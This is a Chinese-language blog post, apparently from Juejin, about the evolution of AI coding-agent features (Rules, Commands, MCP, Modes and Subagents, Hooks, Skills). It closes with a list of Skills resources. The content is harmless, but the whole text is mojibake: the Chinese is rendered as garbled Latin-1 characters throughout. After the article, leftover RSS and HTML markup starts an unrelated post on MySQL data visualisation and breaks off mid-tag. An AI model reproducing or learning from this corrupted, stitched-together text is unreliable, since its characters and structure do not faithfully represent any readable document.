<p>è¯´å®è¯ï¼Œæˆ‘ä¹Ÿè§‰å¾—ç°åœ¨çš„ AI åœˆå„¿æœ‰ç‚¹é€ è¯é€šèƒ€äº†ã€‚</p>
<p>ç½¢äº†ç½¢äº†ï¼Œæ¯•ç«Ÿé€ è¯æœ‰å½±å“åŠ›ï¼Œè¿™äº‹å„¿æ‹¦ä¸ä½ã€‚</p>
<p>é‡ç‚¹æ˜¯ï¼Œå’±ä»¬å¯åˆ«è¢«è¿™äº›æ–°è¯å„¿ç»™å”¬ä½äº†ã€‚</p>
<p>ä¸è¦è¢«å®ƒä»¬æ‹½ç€è·‘ï¼Œç¨å¾®åé€€ä¸€æ­¥ï¼ŒæŠŠæ—¶é—´è½´æ‹‰é•¿ä¸€ç‚¹ã€‚</p>
<p>ä½ ä¼šå‘ç°è¿™äº›çœ‹ä¼¼äº”èŠ±å…«é—¨çš„æ¦‚å¿µï¼Œå…¶å®éƒ½æ˜¯ä¸ºäº†è§£å†³åŒä¸€ä¸ªé—®é¢˜è¯ç”Ÿçš„ã€‚</p>
<p>å½“æˆ‘ä»¬æŠŠè¿™æ®µå†å²ç†é¡ºäº†ï¼Œä½ ä¼šæƒŠå–œåœ°å‘ç°ã€‚</p>
<p>ä¸Šé¢è¿™ä¸€å¤§å †æœ¯è¯­ï¼Œæœ€åå…¶å®éƒ½èƒ½æŠ˜å è¿›ä¸¤ä¸ªè¶…çº§æœ´ç´ çš„æ¦‚å¿µé‡Œã€‚</p>
<p>ä»Šå¤©ï¼Œå’±ä»¬ä¸æ•´é‚£äº›è™šå¤´å·´è„‘çš„æŠ€æœ¯åŸç†ã€‚</p>
<p>å°±å€Ÿç€è¿™è‚¡åŠ²å„¿ï¼Œå” å”  AI ç¼–ç¨‹æ™ºèƒ½ä½“çš„æç®€è¿›åŒ–å²ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå®ç”¨æŒ‡å—ï¼Œæ•™å’±ä»¬æ€ä¹ˆè·Ÿæœºå™¨è¿™å“¥ä»¬å„¿å¤„å¥½å…³ç³»ã€‚</p>
<p>æˆ‘è¿˜ç»™å¤§ä¼™å„¿æ•´ç†äº†ä¸€æ³¢ï¼Œæˆ‘è§‰å¾—çœŸæ­£å¥½ç”¨çš„ç²¾é€‰ Skills èµ„æºï¼Œæ”¾åœ¨æ–‡æœ«ã€‚</p>
<h2 data-id="heading-0">ç¬¬ä¸€é˜¶æ®µï¼šRules ä¸ºäº†ä¸é‡å¤åºŸè¯</h2>
<p>æ•…äº‹çš„èµ·ç‚¹ï¼Œæºäºä¸€ç§å•çº¯çš„å°´å°¬ã€‚</p>
<p>åœ¨æ™ºèƒ½ä½“åˆšå‡ºç°æ—¶ï¼Œå®ƒå°±åƒä¸€ä¸ªåˆšè¿›å¤§å‚çš„å®ä¹ ç”Ÿã€‚</p>
<p>åæ ¡æ¯•ä¸šï¼Œæ™ºå•†æŒºé«˜ï¼Œä½†ç›¸å½“å¥å¿˜ã€‚</p>
<p>è€Œä¸”å®¹æ˜“äº§ç”Ÿå¹»è§‰ï¼Œæ²¡å•¥äº‹å„¿çˆ±çç¢ç£¨ã€‚</p>
<p>ä½ æ¯æ¬¡éƒ½å¾—ä¸åŒå…¶çƒ¦çš„å˜±å’å®ƒã€‚</p>
<p>å“ï¼Œè€å¼Ÿï¼Œæˆ‘çš„é¡¹ç›®ç»“æ„æ˜¯è¿™æ ·çš„ï¼Œæˆ‘ç”¨çš„è¯­è¨€æ˜¯ Pythonï¼Œåˆ«ç»™æˆ‘æ•´ Javaã€‚</p>
<p>è¿™ç§æ—¥å¤ä¸€æ—¥çš„é‡å¤ï¼Œç®€ç›´æ˜¯åœ¨æµªè´¹ç”Ÿå‘½ã€‚</p>
<p>äºæ˜¯ï¼ŒRules è§„åˆ™è¯ç”Ÿäº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/accca74ee29749a8b7603e837d4571a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56ul5qyn5be0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769575855&amp;x-signature=%2FhhDAdE2vYPqkeVhEOmwjSqQwJI%3D" alt="" loading="lazy"/></p>
<p>å®ƒå°±åƒæ˜¯ä½ å†™ç»™ AI çš„ä¸€ä»½å¤§å‚ç”Ÿå­˜æŒ‡å—ã€‚(æ¯”å¦‚ .cursorrules)</p>
<p>ä½ æŠŠé¡¹ç›®èƒŒæ™¯ï¼Œä»£ç é£æ ¼ï¼Œç”šè‡³ä½ é‚£äº›ä¸å¯å‘Šäººçš„å°ç™–å¥½ï¼Œç»Ÿç»Ÿå†™åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œã€‚</p>
<p>ä»æ­¤ä»¥åï¼Œæ¯æ¬¡å¯¹è¯å¼€å§‹å‰ï¼ŒAI éƒ½ä¼šå…ˆé»˜è¯»ä¸€éè¿™ä»½æ‰‹å†Œã€‚</p>
<p>å“¦ï¼Œè€æ¿å–œæ¬¢è¿™ç§ç¼©è¿›ã€‚</p>
<p>å“¦ï¼ŒåŸæ¥è¿™ä¸ªåº“è¿‡æ—¶äº†ä¸èƒ½ç”¨ã€‚</p>
<p>å®ƒä¸å†æ˜¯ä¸€ä¸ªæ»¡å¤§è¡—ä¹±è·‘çš„é€šç”¨çš„ AIï¼Œå®ƒå˜æˆäº†æ‡‚ä½ å¿ƒæ€çš„ä¸“å± AIã€‚</p>
<p>ä½†éšç€é¡¹ç›®è¶Šæè¶Šå¤§ï¼Œå¤§å®¶å‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸å¤Ÿå†™äº†ã€‚</p>
<p>äºæ˜¯å¼€å§‹æ‹†åˆ†ï¼ŒåµŒå¥—ã€‚</p>
<p>æ‹†æ‹†æ‹†ï¼Œå¥—å¥—å¥—ã€‚</p>
<p>ä½†è¿™ç©æ„çš„æ ¸å¿ƒæ²¡å˜ï¼Œå®ƒæ˜¯ä¸€ç§é™æ€çš„ä¸Šä¸‹æ–‡ã€‚</p>
<p>æ— è®ºä½ èŠå•¥ï¼Œå®ƒæ°¸è¿œåœ¨é‚£ï¼Œé»˜é»˜æ ¡å‡†ç€ AI çš„æ¯ä¸€ä¸ªå¿µå¤´ã€‚</p>
<h2 data-id="heading-1">ç¬¬äºŒé˜¶æ®µï¼šCommands è‡ªåŠ¨åŒ–å·¥ä½œæµ</h2>
<p>æœ‰äº†è§„åˆ™ï¼ŒAI æ˜¯æ‡‚ä½ äº†ï¼Œä½†å®ƒçš„æ‰‹è„šè¿˜æ˜¯ä¸å¤Ÿéº»åˆ©ã€‚</p>
<p>æœ‰äº›æ´»å„¿æ˜¯ä½ æ¯å¤©å¾—å¹²å‡ åéçš„ã€‚</p>
<p>æ¯”å¦‚å†™å®Œä»£ç åï¼Œä½ æ€»æ˜¯è¦è¯´ã€‚</p>
<p>è¯·å¸®æˆ‘æŠŠç°åœ¨çš„ commit æ”¹åŠ¨ï¼Œå†™ä¸ªåƒæ ·ç‚¹çš„ message ä¿¡æ¯ï¼Œç„¶å push æ¨ä¸Šå»ï¼Œé¡ºä¾¿å»ºä¸ª PRï¼Œè°¢è°¢å•Šè€å¼Ÿã€‚</p>
<p>æ¯å¤©æ‰“ä¸ªåå‡ éè¿™è¡Œå­—ï¼Œæ‰‹æŒ‡å¤´éƒ½å¾—ç£¨å‡ºèŒ§å­ã€‚</p>
<p>ï¼ˆæ€ªä¸å¾—ç°åœ¨åˆæå‡ºæ¥ä¸€å †è¯­éŸ³è¾“å…¥æ³•ï¼ŒæŒ–ä¸ªå‘ï¼Œåé¢æ‰¾æ—¶é—´å®æµ‹ä¸‹ï¼‰</p>
<p>äºæ˜¯ï¼ŒCommands å‘½ä»¤å‡ºç°äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9b719163f9d4b119c9f681cf307e65b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56ul5qyn5be0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769575855&amp;x-signature=O09T82mqvSiNrzrLIJiF21Yhn0k%3D" alt="" loading="lazy"/></p>
<p>è¿™æœ¬è´¨ä¸Šæ˜¯æŠŠä¸€é•¿ä¸²å” å” å¨å¨çš„æç¤ºè¯ï¼Œæ‰“åŒ…æˆäº†ä¸€ä¸ªçŸ­å°ç²¾æ‚çš„é­”æ³•å’’è¯­ã€‚</p>
<p>ä½ åªéœ€è¦æ•²ä¸€ä¸ª <code>/commit</code>ã€‚</p>
<p>AI å°±åƒå¬åˆ°äº†å‘ä»¤æªï¼Œå’”å’”å’”å°±æŠŠé‚£ä¸€è¿ä¸²ç¹ççš„ Git æ“ä½œå…¨éƒ½ç»™ä½ åŠäº†ã€‚</p>
<p>è¿™ä¸ä»…ä»…æ˜¯ä¸ºäº†çœæ‰‹æŒ‡å¤´ï¼Œæ›´æ˜¯ä¸ºäº†æ ‡å‡†åŒ–ã€‚</p>
<p>ä½ å¯ä»¥æŠŠè¿™äº›å¥½ç”¨çš„å‘½ä»¤å­˜è¿›ä»£ç åº“ï¼Œå‘ç»™æ•´ä¸ªå›¢é˜Ÿã€‚</p>
<p>è¿™ä¸€æ­¥ï¼Œè§£å†³çš„æ˜¯æ‰‹é€Ÿå’Œæ•ˆç‡çš„é—®é¢˜ã€‚</p>
<h2 data-id="heading-2">ç¬¬ä¸‰é˜¶æ®µï¼šMCP ä¸ºäº†è¿æ¥ä¸–ç•Œ</h2>
<p>åˆ°è¿™ä¸€æ­¥ï¼ŒAI è™½ç„¶å¥½ç”¨ï¼Œä½†å®ƒæœ‰ä¸ªè‡´å‘½ä¼¤ï¼Œå®ƒæ˜¯ä¸ªè¶…çº§å®…ç”·ã€‚</p>
<p>å®ƒè¢«å›°åœ¨ä½ çš„ä»£ç ç¼–è¾‘å™¨é‡Œï¼Œçœ‹ç€é‚£ä¸€äº©ä¸‰åˆ†åœ°ã€‚</p>
<p>å®ƒèƒ½çœ‹æ‡‚ä»£ç ï¼Œä½†å®ƒä¸çŸ¥é“åŠå…¬è½¯ä»¶ä¸Šè° @ äº†ä½ ï¼Œä¸çŸ¥é“åˆšæ‰è€æ¿æäº†å•¥æ–°å·¥å•ï¼Œæ›´ä¸çŸ¥é“æ•°æ®åº“é‡Œç°åœ¨æ˜¯ä»€ä¹ˆé¬¼æ ·å­ã€‚</p>
<p>è¿™å“ªè¡Œå•Šï¼Ÿ</p>
<p>æˆ‘ä»¬è¦è®©å®ƒèµ°å‡ºå®¶é—¨ï¼Œå» City Walk ä¸€ä¸‹ï¼Œå»è·ŸçœŸå®ä¸–ç•Œç¢°ä¸€ç¢°ã€‚</p>
<p>è¿™å°±æ˜¯ MCP çš„æ„ä¹‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7557f91813fe404bafa1a86451d3683f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56ul5qyn5be0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769575855&amp;x-signature=GL1Ef0MKdlqXBHjxt8%2BqEfUjcvw%3D" alt="" loading="lazy"/></p>
<p>å®ƒä¸ä»…ä»…æ˜¯æç¤ºè¯ï¼Œå®ƒæ˜¯æ¥å£ï¼Œæ˜¯è§¦æ‰‹ã€‚</p>
<p>å®ƒè®© AI èƒ½æŠŠæ‰‹ä¼¸å‡ºå»ï¼Œå»è°ƒç¬¬ä¸‰æ–¹å·¥å…·ï¼Œå»è¯»æ•°æ®åº“ï¼Œå»å‘æ¶ˆæ¯ï¼Œå»ç®¡ç†æœåŠ¡å™¨ã€‚</p>
<p>ä½†è¿™ç©æ„å„¿å¸¦æ¥äº†ä¸€ä¸ªä¸¥é‡çš„å‰¯ä½œç”¨ã€‚</p>
<p>ä¿¡æ¯è¿‡è½½ã€‚</p>
<p>å¦‚æœä½ æŠŠå‡ ç™¾ä¸ªå·¥å…·ä¸€è‚¡è„‘å¡ç»™ AIï¼Œå°±åƒç»™ä¸€ä¸ªäººåŒæ—¶å¡äº† 100 æœ¬ä¹¦è®©ä»–è¯»ã€‚</p>
<p>ä»–çš„æ³¨æ„åŠ›ç¬é—´å°±æ•£äº†ï¼Œååº”å˜æ…¢äº†ã€‚</p>
<p>ç”šè‡³å› ä¸ºä¿¡æ¯é‡å¤ªå¤§ï¼Œå¼€å§‹èƒ¡è¨€ä¹±è¯­ï¼Œä¸€æœ¬æ­£ç»åœ°èƒ¡è¯´å…«é“ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b34572a272a34779876918e1ca485f64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56ul5qyn5be0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769575855&amp;x-signature=vumJsrz4ba9roIuf%2BMjICDt%2F7IU%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸€æ­¥ï¼Œè§£å†³äº†è¿æ¥çš„é—®é¢˜ï¼Œå´å¸¦æ¥äº†ä¸“æ³¨çš„éšæ‚£ï¼ŒæŠŠè„‘å­ç»™æä¹±äº†ã€‚</p>
<h2 data-id="heading-3">ç¬¬å››é˜¶æ®µï¼šModes &amp; Subagents ä¸ºäº†ä¸“æ³¨</h2>
<p>ä¸ºäº†è§£å†³å…¨èƒ½ä½†è‡ƒè‚¿çš„é—®é¢˜ï¼Œå’±ä»¬å¾—åšå‡æ³•ã€‚</p>
<p>Modes æ¨¡å¼å’Œ Subagents å­æ™ºèƒ½ä½“ï¼Œæ¥äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9041acd0e7804b56aeae30c55767f9bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56ul5qyn5be0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769575855&amp;x-signature=HfO8fQ%2BTEQJvI8eD2UlY%2Bspjk9A%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac812710faf542e0a720f35f58d584b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56ul5qyn5be0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769575855&amp;x-signature=1x3v5JlboY2spcqXkndnTKUPYP4%3D" alt="" loading="lazy"/></p>
<p>è¯´ç™½äº†ï¼Œå°±æ˜¯ç»™ AI æˆ´ä¸Šä¸åŒçš„å¸½å­ã€‚</p>
<p>å½“ä½ éœ€è¦ææ¶æ„è®¾è®¡çš„æ—¶å€™ï¼Œä½ å‘¼å«çš„æ˜¯æ¶æ„å¸ˆæ¨¡å¼çš„ AIã€‚</p>
<p>å®ƒçœ‹ä¸åˆ°é‚£äº›é¸¡æ¯›è’œçš®çš„ä»£ç ç»†èŠ‚ï¼Œä½†å®ƒæ‰‹é‡Œæ‹¿ç€è§„åˆ’å·¥å…·ï¼Œåœ¨é‚£æŒ‡ç‚¹æ±Ÿå±±ã€‚</p>
<p>å½“ä½ éœ€è¦ä¿® Bug çš„æ—¶å€™ï¼Œä½ å‘¼å«çš„æ˜¯å·¥ç¨‹å¸ˆæ¨¡å¼çš„ AIã€‚</p>
<p>å®ƒä¸“æ³¨äºä»£ç è°ƒè¯•ï¼Œä¸¤è€³ä¸é—»çª—å¤–äº‹ï¼Œä¸€å¿ƒåªä¿®åœ£è´¤ç ã€‚</p>
<p>é™åˆ¶äº†è§†é‡ï¼Œé™åˆ¶äº†å·¥å…·ï¼ŒAI å°±ä¸å®¹æ˜“è·‘åã€‚</p>
<p>è¿™æ‹›çš„æ ¸å¿ƒç›®çš„åªæœ‰ä¸€ä¸ªï¼Œæé«˜å¯é æ€§ã€‚</p>
<h2 data-id="heading-4">ç¬¬äº”é˜¶æ®µï¼šHooks ä¸ºäº†ç¡®å®šæ€§</h2>
<p>å³ä½¿æœ‰äº†ä¸Šé¢è¿™ä¸€å †ç¥å™¨ï¼ŒAI æœ¬è´¨ä¸Šè¿˜æ˜¯ä¸ªæ¦‚ç‡æ¨¡å‹ã€‚</p>
<p>å®ƒæœ‰æ—¶å€™å¿ƒæƒ…å¥½ï¼Œç»™ä½ æ•´å¾—æŒºæ¼‚äº®ã€‚</p>
<p>æœ‰æ—¶å€™å¿ƒæƒ…ä¸å¥½ï¼Œè¿˜æ˜¯ä¼šè‡ªç”±å‘æŒ¥ï¼Œäº§ç”Ÿå¹»è§‰ã€‚</p>
<p>ä½†å·¥ç¨‹ä¸–ç•Œæ˜¯ä¸¥è°¨çš„ï¼Œæˆ‘ä»¬è¦çš„æ˜¯ 100% çš„ç¡®å®šæ€§ã€‚</p>
<p>äºæ˜¯ï¼ŒHooks é’©å­è¢«å¼•å…¥äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6eee59aea3174f82b96623c62efe6e2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56ul5qyn5be0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769575855&amp;x-signature=kyfE9sBX%2Bwdzhlb8liJxuu%2B1gMA%3D" alt="" loading="lazy"/></p>
<p>è¿™ç©æ„å„¿å°±æ˜¯ AI æ¦‚ç‡ä¸–ç•Œé‡Œçš„å®šæµ·ç¥é’ˆï¼Œä¹Ÿæ˜¯é‚£æ¡ä¸å¯é€¾è¶Šçš„çº¢çº¿ã€‚</p>
<p>æ¯”å¦‚ï¼Œæ— è®º AI å˜´ä¸Šè¯´å¾—å†å¥½å¬å†ä¼šèˆ”ï¼Œåœ¨æäº¤ä»£ç å‰ï¼Œå¿…é¡»å¼ºåˆ¶è¿è¡Œä¸€æ¬¡ä»£ç æ£€æŸ¥è„šæœ¬ã€‚</p>
<p>æˆ–è€…ï¼Œæ¯ä¸€æ¬¡äº¤äº’ç»“æŸï¼Œå¿…é¡»æŠŠæ‘˜è¦è®°åˆ°æ•°æ®åº“é‡Œã€‚</p>
<p>Hooks ä¸è·Ÿä½ å•†é‡ï¼Œä¹Ÿä¸è·Ÿä½ å˜»å˜»å“ˆå“ˆï¼Œå®ƒä¿è¯äº†åº•çº¿ã€‚</p>
<h2 data-id="heading-5">ç»ˆå±€ï¼šå¤§é“è‡³ç®€</h2>
<p>å›é¡¾å®Œè¿™æ®µå†å²ï¼Œä½ ä¼šå‘ç°æ¦‚å¿µè¶Šæ¥è¶Šå¤šï¼Œè„‘å­è¶Šæ¥è¶Šä¹±ã€‚</p>
<p>ä½†ä½œä¸ºä½¿ç”¨è€…ï¼Œå’±ä»¬ä¸éœ€è¦è®°é‚£ä¹ˆå¤šè¯å„¿ã€‚</p>
<p>å’±ä»¬åªéœ€è¦ï¼Œå»ºç«‹ä¸€ä¸ªæœ€ç®€å•çš„å¿ƒç†æ¨¡å‹æ¥é©¾é©­è¿™ä¸€åˆ‡ã€‚</p>
<p>å…¶å®ï¼Œæ‰€æœ‰è¿™äº›èŠ±é‡Œèƒ¡å“¨çš„æœ¯è¯­ï¼Œæœ€åéƒ½åœ¨å‘ä¸¤ä¸ªæ–¹å‘æ”¶æ•›ã€‚</p>
<p>ä½ åªéœ€è¦è®°ä½è¿™ä¸¤ä¸ªè¯ã€‚</p>
<p>1ã€Rulesï¼šé™æ€çš„å¿ƒæ³•</p>
<p>2ã€Skillsï¼šåŠ¨æ€çš„æ‹›å¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15e5bd7a8b4a44f0a45ffba95c2518c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56ul5qyn5be0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769575855&amp;x-signature=XQ7%2Btfqrh1yJEY4dLxmF23pJuRA%3D" alt="" loading="lazy"/></p>
<p>Rules æ˜¯å¤§è„‘çš„è®°å¿†ã€‚</p>
<p>å®ƒåŒ…å«ä½ çš„åå¥½ï¼Œä½ çš„æŠ€æœ¯æ ˆï¼Œä½ çš„ä»£ç è§„èŒƒï¼Œå®ƒåº”è¯¥å°½å¯èƒ½ç²¾ç®€ï¼Œé«˜è´¨é‡ã€‚</p>
<p>å¦‚æœ AI æç ¸äº†ï¼Œä¸è¦åªæ˜¯å…‰æ”¹ä»£ç ï¼Œè¦å»ä¿®æ­£ Rulesï¼Œè®©å®ƒé•¿è®°æ€§ã€‚</p>
<p>Skills æ˜¯æ‰‹ä¸­çš„å…µå™¨ã€‚</p>
<p>å®ƒåŒ…å«äº† Commandsï¼ŒMCPï¼ŒSubagents ç­‰æ‰€æœ‰åŠ¨ä½œã€‚</p>
<p>Skills çš„ç¾å¦™ä¹‹å¤„åœ¨äºï¼Œå®ƒä»¬æ˜¯æŒ‰éœ€åŠ è½½çš„ã€‚</p>
<p>ä½ å¯ä»¥æ‹¥æœ‰ 100 ç§å…µå™¨ï¼Œå€šå¤©å‰‘å± é¾™åˆ€éƒ½åœ¨èƒŒä¸ŠèƒŒç€ï¼Œä½†åªåœ¨éœ€è¦çš„æ—¶å€™æ‰äº®å‰‘ã€‚</p>
<p>æœ€åï¼Œå’±ä»¬è¯¥å’‹æ•´ï¼Ÿ</p>
<p>æŠŠä¸–ç•Œç®€åŒ–æˆè¿™ä¸¤è€…åï¼Œæ“ä½œå°±å˜å¾—æ¸…æ™°äº†ã€‚</p>
<p>æ‰“ç£¨ä½ çš„ Rulesï¼ŒæŠŠå®ƒå½“æˆä¸€ä¸ªæœ‰ç”Ÿå‘½çš„äº§å“ï¼Œè¿™æ˜¯ä½ å’Œ AI çš„ç£¨åˆè¿‡ç¨‹ï¼Œæ˜¯ä½ ä»¬ä¹‹é—´çš„é»˜å¥‘ã€‚</p>
<p>ç§¯ç´¯ä½ çš„ Skillsï¼ŒæŠŠä½ çš„å·¥ä½œæµï¼ˆWorkflowï¼‰ä»£ç åŒ–ã€‚</p>
<p>ä¸ç®¡æ˜¯ Git æµç¨‹è¿˜æ˜¯æ•°æ®åº“æŸ¥è¯¢ï¼Œå°è£…æˆ Skillï¼Œè®©å·¥å…·ä¸ºäººæœåŠ¡ã€‚</p>
<p>æŠ€æœ¯å¹³æƒçš„æœ¬è´¨ï¼Œå¯ä¸æ˜¯è®©äººå»å­¦æ›´å¤šä¹±ä¸ƒå…«ç³Ÿçš„æœ¯è¯­ã€‚</p>
<p>æŠ€æœ¯å¹³æƒçš„æœ¬è´¨ï¼Œæ˜¯è®©å·¥å…·å˜å¾—æ›´åƒèº«ä½“çš„ä¸€éƒ¨åˆ†ï¼Œç”šè‡³å˜å¾—åƒå‘¼å¸ä¸€æ ·è½»æ¾è‡ªç„¶ã€‚</p>
<p>å¸Œæœ›æœ¬æ–‡å¯ä»¥å¸®ä½ ä»æœ¯è¯­çš„è‹¦æµ·ä¸­è§£è„±å‡ºæ¥ã€‚</p>
<p>ç«‹é©¬æ”¯æ£±èµ·æ¥ï¼Œå»é©¯æœä½ çš„ AI å§ã€‚</p>
<blockquote>
<p>å‚è€ƒèµ„æ–™ï¼š
<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DL_p5GxGSB_I" target="_blank" title="https://www.youtube.com/watch?v=L_p5GxGSB_I" ref="nofollow noopener noreferrer">www.youtube.com/watch?v=L_pâ€¦</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fcn%2Fdocs" target="_blank" title="https://cursor.com/cn/docs" ref="nofollow noopener noreferrer">cursor.com/cn/docs</a></p>
</blockquote>
<h2 data-id="heading-6">ç²¾é€‰ Skills èµ„æº</h2>
<h3 data-id="heading-7">1ã€Claude Code Skills å®˜æ–¹æ–‡æ¡£</h3>
<ul>
<li>å…¥é—¨å’Œè¿›é˜¶ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fen%2Fskills" target="_blank" title="https://code.claude.com/docs/en/skills" ref="nofollow noopener noreferrer">code.claude.com/docs/en/skiâ€¦</a></li>
<li>æœ€ä½³å®è·µ <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.claude.com%2Fdocs%2Fen%2Fagents-and-tools%2Fagent-skills%2Fbest-practices" target="_blank" title="https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices" ref="nofollow noopener noreferrer">platform.claude.com/docs/en/ageâ€¦</a></li>
</ul>
<h3 data-id="heading-8">2ã€Claude Code Skills å®˜æ–¹ä»“åº“ï¼Œ46.9k Star</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills" target="_blank" title="https://github.com/anthropics/skills" ref="nofollow noopener noreferrer">github.com/anthropics/â€¦</a></li>
</ul>
<h3 data-id="heading-9">3ã€ç²¾é€‰ Skills ä»“åº“ï¼Œ22.7k Star</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FComposioHQ%2Fawesome-claude-skills" target="_blank" title="https://github.com/ComposioHQ/awesome-claude-skills" ref="nofollow noopener noreferrer">github.com/ComposioHQ/â€¦</a></li>
</ul>
<h3 data-id="heading-10">4ã€æ ¸å¿ƒ Skills åº“å’Œå¼€å‘æ–¹æ³•è®ºæ¡†æ¶ï¼Œ31k Star</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwln%2Fobra-superpowers" target="_blank" title="https://github.com/wln/obra-superpowers" ref="nofollow noopener noreferrer">github.com/wln/obra-suâ€¦</a></li>
</ul>
<h3 data-id="heading-11">5ã€Skills å¸‚åœºï¼Œå·²æ”¶å½• 7w+ ä¸ª</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fskillsmp.com%2F" target="_blank" title="https://skillsmp.com/" ref="nofollow noopener noreferrer">skillsmp.com/</a></li>
</ul>
<h3 data-id="heading-12">6ã€ç½‘ç«™ï¼Œä»£ç åº“ï¼ŒPDF æ–‡ä»¶è‡ªåŠ¨è½¬æ¢ Skills</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyusufkaraaslan%2FSkill_Seekers" target="_blank" title="https://github.com/yusufkaraaslan/Skill_Seekers" ref="nofollow noopener noreferrer">github.com/yusufkaraasâ€¦</a></li>
</ul>
<h3 data-id="heading-13">7ã€Skills ä¾¿æ·å®‰è£…å·¥å…·</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvercel-labs%2Fadd-skill" target="_blank" title="https://github.com/vercel-labs/add-skill" ref="nofollow noopener noreferrer">github.com/vercel-labsâ€¦</a></li>
</ul>
<h3 data-id="heading-14">8ã€ç±» Manusï¼Œå¢å¼ºé•¿æœŸè®°å¿†å’Œä»»åŠ¡è§„åˆ’çš„ Skills</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOthmanAdi%2Fplanning-with-files" target="_blank" title="https://github.com/OthmanAdi/planning-with-files" ref="nofollow noopener noreferrer">github.com/OthmanAdi/pâ€¦</a></li>
</ul>
<h2 data-id="heading-15">â¤ï¸çˆ±å¿ƒä¸‰è¿å‡»</h2>
<p>1.å¦‚æœä½ è§‰å¾—æ¬§å·´çš„æ–‡ç« è¿˜åˆèƒƒå£ï¼Œå°±ç‚¹ä¸ªèµæ”¯æŒä¸‹å§ï¼Œä½ çš„<strong>èµ</strong>æ˜¯æˆ‘æœ€å¤§çš„åŠ¨åŠ›ã€‚</p>
<p>2.å…³æ³¨&gt;&gt;&gt;<a href="https://link.juejin.cn?target=https%3A%2F%2Fraw.githubusercontent.com%2FGeekhyt%2Ffront-end-canteen%2Frefs%2Fheads%2Fmaster%2Fimages%2Fqrcode.jpg" target="_blank" title="https://raw.githubusercontent.com/Geekhyt/front-end-canteen/refs/heads/master/images/qrcode.jpg" ref="nofollow noopener noreferrer">å…¬ä¼—å·æ¬§å·´èŠAI</a>ï¼ŒAI æ—¶ä»£é™ªä½ ä¸€èµ·æˆé•¿ã€‚</p>
<p>3.ç‚¹èµã€è¯„è®ºã€è½¬å‘ === å‚¬æ›´ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨MySQLç©è½¬æ•°æ®å¯è§†åŒ–]]></title>    <link>https://juejin.cn/post/7597968460651544618</link>    <guid>https://juejin.cn/post/7597968460651544618</guid>    <pubDate>2026-01-22T06:56:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597968460651544618" data-draft-id="7597900782911291411" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨MySQLç©è½¬æ•°æ®å¯è§†åŒ–"/> <meta itemprop="keywords" content="å¾®ä¿¡å°ç¨‹åº"/> <meta itemprop="datePublished" content="2026-01-22T06:56:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" 